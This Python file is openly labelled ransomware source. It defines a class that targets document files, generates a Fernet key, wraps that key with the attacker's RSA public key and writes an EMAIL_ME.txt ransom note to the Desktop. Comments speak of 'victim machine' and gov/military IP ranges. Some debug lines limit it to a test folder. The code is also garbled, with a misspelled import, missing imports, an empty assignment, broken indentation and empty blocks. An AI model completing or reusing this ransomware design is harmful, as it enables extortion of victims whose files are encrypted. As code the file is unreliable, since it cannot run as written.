# Import the necessary libraries
from cryptoraphy.fernet import Fernet
import os



class RansomWare:

    
    # File exstensions to seek out and Encrypt
    file_exts = [
        '.txt', '.log', '.csv', '.doc', '.docx' '.xls', '.pdf', '.xlsx', '.ppt'
        

    ]


    def __init__(self,  test_folder: str = "ransomware_test_env"):
        # Key that will be used for Fernet object and encrypt/decrypt method
        self.key = None
        
        # Encrypt/Decrypter
        self.crypter = None
        
        # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
        self.rsa_public = None
        self.encrypted_fernet = None
        

        ''' Root directorys to start Encryption/Decryption from
            CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
            CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
            CAUTION: eg, use 'localRoot' and create Some folder directory and files in them folders etc.
        '''
        self.sysRoot =
        # Use sysroot to create absolute path for files, etc. And for encrypting whole system
        cwd = Path.cwd() cwd
        
        # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
        self.sysRoot = cwd
        self.localRoot = cwd / test_folder
        self.localRoot.mkdir(parents=True, exist_ok=True)

         # Debugging/Testing
        self.debug = True

          if self.debug:
            print(f"[DEBUG] localRoot set to: {self.localRoot.resolve()}")
            print("[DEBUG] This demo will ONLY operate on files inside the localRoot.")
            print("[DEBUG] Create files inside that folder to test encryption/decryption.")

        # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
        


    # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
    
    def generate_key(self):
        # Generates a url safe(base64 encoded) key
        self.key = Fernet.generate_key()
        
        # Creates a Fernet object with encrypt/decrypt methods
        self.crypter = Fernet(self.key)
        if self.debug:
            print("[DEBUG] Generated new Fernet symmetric key (in-memory).")
        return self.key

        
    
    # Write the fernet(symmetric key) to text file
    def write_key(self, filename: str = 'fernet_key.txt', overwrite: bool = False):
    
     # Encrypt [SYMMETRIC KEY] that was created on victim machine to Encrypt/Decrypt files with our PUBLIC ASYMMETRIC-
     target = self.localRoot / filename
        if target.exists() and not overwrite:
            raise FileExistsError(f"{target} exists. Set overwrite=True to replace.")
        if self.key is None:
            raise ValueError("No Fernet key in memory. Call generate_key() first.")
        with open(target, 'wb') as f:
            f.write(self.key)
        if self.debug:
            print(f"[DEBUG] Wrote fernet key to {target}")

     # -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYSMETRIC KEY used for-
     # -Encrypt/Decrypt of files on target machine with our PRIVATE KEY, so that they can then Decrypt files etc.
    
    def encrypt_fernet_key(self, rsa_public_pem_path: str = None, out_filename: str = 'fernet_key.encrypted'):
        if self.key is None:
            raise ValueError("No fernet key available. Call generate_key() first.")

        if rsa_public_pem_path is None:
            raise ValueError("Provide a path to an RSA public key PEM to wrap the fernet key.")

        rsa_path = Path(rsa_public_pem_path)
        if not rsa_path.is_file():
            raise FileNotFoundError(f"RSA public key file not found: {rsa_public_pem_path}")

            # Public RSA key
            with open(rsa_path, 'rb') as f:
            pub_pem = f.read()
            
            # Public encrypter object
            public_key = serialization.load_pem_public_key(pub_pem)
            encrypted = public_key.encrypt(
            self.key,
            padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                         algorithm=hashes.SHA256(),
                         label=None)
            )
            
            # Encrypted fernet key
            
            # Write encrypted fernet key to file
            
        # Write encrypted fernet key to dekstop as well so they can send this file to be unencrypted and get system/files back
        with open(f'{self.sysRoot}Desktop/EMAIL_ME.txt', 'wb') as fa:
            
        # Assign self.key to encrypted fernet key
        
        # Remove fernet crypter object
        self.crypter = None
